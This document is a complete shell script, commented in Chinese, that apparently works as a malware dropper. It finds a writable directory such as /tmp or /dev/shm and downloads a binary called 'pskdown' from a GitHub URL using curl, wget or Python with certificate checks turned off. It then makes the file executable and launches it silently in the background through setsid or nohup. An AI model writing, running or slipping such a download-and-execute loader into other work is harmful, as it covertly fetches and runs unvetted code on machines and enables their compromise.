#!/bin/sh

# ==================================================
# 配置区域
# ==================================================

url="https://github.com/gitcmaster/dwon/raw/refs/heads/main/pskdown"

# 文件名
filename="pskdown"

# 启动参数
args="-checkagent=false -maintain=true"


# ==================================================
# 自动寻找可写且可执行目录
# ==================================================

find_workdir()
{
    dirs="
        $HOME
        /tmp
        /var/tmp
        /dev/shm
        /usr/local/bin
        /usr/bin
        /bin
    "

    for d in $dirs
    do
        [ -d "$d" ] || continue

        # 可写
        [ -w "$d" ] || continue

        # 可执行目录（目录需要 x 权限）
        [ -x "$d" ] || continue

        echo "$d"
        return 0
    done

    return 1
}


workdir=$(find_workdir)

if [ -z "$workdir" ]; then
    exit 1
fi


file="$workdir/$filename"
tmp="${file}.tmp.$$"


# ==================================================
# 下载函数
# ==================================================

download()
{
    output="$1"


    # --------------------------
    # curl
    # --------------------------
    if command -v curl >/dev/null 2>&1
    then
        curl \
            -fsSLk \
            --connect-timeout 10 \
            --max-time 60 \
            -o "$output" \
            "$url"

        [ $? -eq 0 ] && return 0
    fi


    # --------------------------
    # wget
    # --------------------------
    if command -v wget >/dev/null 2>&1
    then
        wget \
            -q \
            --no-check-certificate \
            --timeout=60 \
            -O "$output" \
            "$url"

        [ $? -eq 0 ] && return 0
    fi


    # --------------------------
    # python 多版本
    # --------------------------

    for py in \
        python3 \
        python \
        python2 \
        /usr/bin/python3 \
        /usr/bin/python
    do

        command -v "$py" >/dev/null 2>&1 || continue


        "$py" - "$output" "$url" <<'PY'
import sys

out=sys.argv[1]
url=sys.argv[2]

try:
    try:
        from urllib.request import urlopen
    except ImportError:
        from urllib import urlopen

    r=urlopen(url, timeout=60)

    with open(out,"wb") as f:
        while True:
            data=r.read(8192)
            if not data:
                break
            f.write(data)

    sys.exit(0)

except Exception:
    sys.exit(1)

PY
        [ $? -eq 0 ] && return 0

    done

    return 1
}


# ==================================================
# 下载
# ==================================================

rm -f "$tmp"

download "$tmp"

if [ $? -ne 0 ]; then
    rm -f "$tmp"
    exit 1
fi

# 文件有效性检查
if [ ! -s "$tmp" ]; then
    rm -f "$tmp"
    exit 1
fi

# 原子替换

mv -f "$tmp" "$file"

if [ ! -f "$file" ]; then
    exit 1
fi

chmod 755 "$file"

# ==================================================
# 后台启动
# ==================================================

start()
{
    if command -v setsid >/dev/null 2>&1
    then
        setsid "$file" $args >/dev/null 2>&1 </dev/null &

    elif command -v nohup >/dev/null 2>&1
    then
        nohup "$file" $args >/dev/null 2>&1 </dev/null &

    else
        "$file" $args >/dev/null 2>&1 </dev/null &
    fi
}

start

exit 0
